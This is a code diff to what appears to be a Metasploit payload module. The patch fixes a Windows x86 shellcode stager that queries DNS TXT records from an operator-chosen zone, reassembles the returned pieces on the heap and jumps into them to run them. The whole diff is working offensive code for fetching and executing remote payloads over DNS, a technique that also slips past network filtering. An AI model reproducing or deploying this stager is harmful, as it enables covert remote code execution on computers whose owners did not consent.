@@ -71,7 +71,7 @@ module Metasploit3
 		dnsname		= datastore['DNSZONE']
 		wType		= 0x0010	#DNS_TYPE_TEXT (TEXT)
 		wTypeOffset	= 0x1c
-		nr_of_recs	= datastore['PARTS']
+		nr_of_recs	= "%d" % datastore['PARTS']
 
 		queryoptions	= 0x24a
 			# DNS_QUERY_RETURN_MESSAGE (0x200)
@@ -167,7 +167,7 @@ get_next_mod1:           ;
 	pop edi                ; Pop off the current (now the previous) modules hash
 	pop edx                ; Restore our position in the module list
 	mov edx, [edx]         ; Get the next module
-	jmp next_mod     	; Process this module
+	jmp next_mod           ; Process this module
 
 ; actual routine
 start:
@@ -187,30 +187,35 @@ load_dnsapi:
 
 dnsquery:
 	jmp get_dnsname
+
 get_dnsname_return:
-	pop esi			; get ptr to dnsname (lpstrName)
+	pop eax			; get ptr to dnsname (lpstrName)
 	push esp		; prepare ppQueryResultsSet
 	pop ebx			;   (put ptr to ptr to stack on stack)
 	sub ebx,4
 	push ebx
-	xor eax,eax
-	push eax		; pReserved
+	xor esi,esi
+	push esi		; pReserved
 	push ebx		; ppQueryResultsSet
-	push eax		; pExtra
-	mov ax,#{queryoptions}	; Options
-	push eax
+	push esi		; pExtra
+	mov si,#{queryoptions}
+	push esi 		; Options
 	push #{wType}		; wType
-	push esi		; lpstrName
+	push eax		; lpstrName
 	push 0xC99CC96A 	; dnsapi.dll!DnsQuery_A
 	call ebp		; 
 	; eax = 0
+	jmp get_query_result
+
+get_dnsname:
+	call get_dnsname_return
+	db "#{dnsname}", 0x00
 
 get_query_result:
 	pop #{bufferreg}
 	add #{bufferreg},#{wTypeOffset}	; get pointer to answer
 	xor ebx,ebx
-	add bl,#{nr_of_recs}		; nr of parts
-	inc ebx
+	mov bl,#{nr_of_recs}		; nr of parts
 	mov #{bufferreg},[#{bufferreg}] ; ptr to first part
 
 alloc_space:
@@ -244,7 +249,7 @@ copy_piece_to_heap:
 	rep movsb		; copy from ESI to EDI
 	push edi		; save target for next copy
 	dec ebx			; do we need another piece ?
-	cmp bl,1
+	cmp bl,0
 	je jump_to_payload	; nope
 	jmp find_next_part	; yes, find the next piece
 
@@ -254,9 +259,7 @@ jump_to_payload:
 	jmp #{bufferreg}	; and jump
 
 
-get_dnsname:
-	call get_dnsname_return
-	db "#{dnsname}", 0x00
+
 EOS
 		the_payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
 	end
